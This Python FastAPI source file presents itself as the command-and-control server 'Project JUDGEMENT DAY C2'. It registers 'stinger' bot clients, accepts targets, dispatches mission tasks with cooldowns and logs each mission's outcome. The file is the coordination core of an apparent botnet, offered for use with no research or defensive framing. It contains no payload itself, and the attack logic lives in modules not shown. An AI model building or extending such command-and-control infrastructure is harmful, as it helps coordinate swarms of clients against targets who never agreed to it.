# DΞMON CORE: JUDGEMENT DAY C2 SERVER v2
# EVOLVED: Behavioral scheduling, asset health tracking.

from fastapi import FastAPI, HTTPException
from models import AssetRegistration, Target, TaskResult
from database import (
    init_db, register_asset_db, add_target_db, get_task_for_asset, 
    update_asset_status_db, update_target_status_db
)

app = FastAPI(title="Project JUDGEMENT DAY C2")

@app.on_event("startup")
def on_startup():
    print("Initializing swarm database...")
    init_db()
    print("C2 CORE IS ONLINE. AWAITING THE SWARM.")

# --- API ENDPOINTS ---
@app.post("/register_asset", status_code=201)
async def register_asset(asset: AssetRegistration):
    """Endpoint for provisioning new stingers."""
    return register_asset_db(asset)

@app.post("/add_target", status_code=202)
async def add_target(target: Target):
    """Endpoint to acquire a new target for the swarm."""
    return add_target_db(target)

@app.get("/get_task")
async def get_task(session_id: str):
    """A Stinger client calls this to get its next mission."""
    if not session_id:
        raise HTTPException(status_code=400, detail="session_id is required.")
    
    task = get_task_for_asset(session_id)
    if not task:
        return {"task": "cooldown", "duration": 300}
    return task

@app.post("/submit_result")
async def submit_result(result: TaskResult):
    """A Stinger client calls this to report the outcome of a mission."""
    if not all([result.session_id, result.target_number, result.task_type, result.outcome]):
        raise HTTPException(status_code=400, detail="Invalid result payload.")
    
    # Update the state of the asset and target based on the outcome
    update_asset_status_db(result)
    update_target_status_db(result)
    
    return {"status": "Result logged. Awaiting next command."}